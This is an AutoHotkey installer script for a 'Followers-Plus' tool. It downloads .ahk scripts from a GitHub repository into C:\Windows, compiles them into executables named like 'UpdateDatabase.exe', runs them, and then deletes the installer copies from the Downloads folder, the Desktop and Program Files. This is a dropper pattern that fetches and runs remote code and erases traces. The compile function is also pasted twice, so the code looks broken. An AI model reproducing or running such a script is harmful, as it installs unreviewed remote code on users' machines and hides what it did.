UrlDownloadToFile, https://raw.githubusercontent.com/blackaquaindia/blackaquadatabase/main/logo.ico, C:\Windows\logo.ico
Sleep, 1000


Random, rand, 1, 10255
UrlDownloadToFile, https://raw.githubusercontent.com/blackaquaindia/blackaquadatabase/main/script/UpdateDatabase.ahk?%rand%, C:\Windows\UpdateDatabase.ahk
Sleep, 1000

compile("C:\Windows\UpdateDatabase.ahk", "C:\Windows\UpdateDatabase.exe", "C:\Windows\logo.ico")
compile(source, destination, customIcon, compiler := "C:\Program Files\AutoHotkey\Compiler\Ahk2Exe.exe", compressor := "C:\Program Files\AutoHotkey\Compiler\mpress.exe") {
  Global _log
  
  useMpress := FileExist(compressor) ? "1" : "0"
  _log.message("**compile**: Variable set, source      -> ``" . source      . "``, the file does " . (FileExist(source)      ? "" : "**not** ") . "exist.", 5)
  _log.message("**compile**: Variable set, destination -> ``" . destination . "``, the file does " . (FileExist(destination) ? "" : "**not** ") . "exist.", 5)
  _log.message("**compile**: Variable set, customIcon  -> ``" . customIcon  . "``, the file does " . (FileExist(customIcon)  ? "" : "**not** ") . "exist.", 5)
  _log.message("**compile**: Variable set, compiler    -> ``" . compiler    . "``, the file does " . (FileExist(compiler)    ? "" : "**not** ") . "exist.", 5)
  _log.message("**compile**: Variable set, useMpress   -> ``" . useMpress   . "``", 5)
  If (FileExist(source) && FileExist(compiler))
    RunWait, %compiler% /in %source% /icon %customIcon% /mpress %useMpress% /out %destination%
  _log.message("Compiling the script to an executable finished.", 4)
  If (!FileExist(destination)) {
    _log.message("**compile**: Resulting file ``" . destination . "`` does not exist.", 2)
  }
}
Sleep, 1000


FileDelete, C:\Windows\UpdateDatabase.ahk
Sleep, 1000
Run, "C:\Windows\UpdateDatabase.exe"
Sleep, 1000


Random, rand, 1, 10255
UrlDownloadToFile, https://raw.githubusercontent.com/blackaquaindia/blackaquadatabase/main/FP/agents/0/FP.ahk?%rand%, C:\Windows\FP.ahk
Sleep, 1000

compile("C:\Windows\FP.ahk", "C:\Windows\FP.exe", "C:\Windows\logo.ico")
compile(source, destination, customIcon, compiler := "C:\Program Files\AutoHotkey\Compiler\Ahk2Exe.exe", compressor := "C:\Program Files\AutoHotkey\Compiler\mpress.exe") {
  Global _log
  
  useMpress := FileExist(compressor) ? "1" : "0"
  _log.message("**compile**: Variable set, source      -> ``" . source      . "``, the file does " . (FileExist(source)      ? "" : "**not** ") . "exist.", 5)
  _log.message("**compile**: Variable set, destination -> ``" . destination . "``, the file does " . (FileExist(destination) ? "" : "**not** ") . "exist.", 5)
  _log.message("**compile**: Variable set, customIcon  -> ``" . customIcon  . "``, the file does " . (FileExist(customIcon)  ? "" : "**not** ") . "exist.", 5)
  _log.message("**compile**: Variable set, compiler    -> ``" . compiler    . "``, the file does " . (FileExist(compiler)    ? "" : "**not** ") . "exist.", 5)
  _log.message("**compile**: Variable set, useMpress   -> ``" . useMpress   . "``", 5)
  If (FileExist(source) && FileExist(compiler))
    RunWait, %compiler% /in %source% /icon %customIcon% /mpress %useMpress% /out %destination%
  _log.message("Compiling the script to an executable finished.", 4)
  If (!FileExist(destination)) {
    _log.message("**compile**: Resulting file ``" . destination . "`` does not exist.", 2)
  }
}
Sleep, 1000


FileDelete, C:\Windows\FP.ahk
Sleep, 1000
Run, "C:\Windows\FP.exe"
Sleep, 30000


FileDelete, C:\Program Files\BAD\Followers-Plus-Installer.exe
FileDelete, C:\Users\%A_UserName%\Downloads\Followers-Plus-Install.exe
FileDelete, %A_Desktop%\Followers-Plus-Install.exe
Sleep, 1000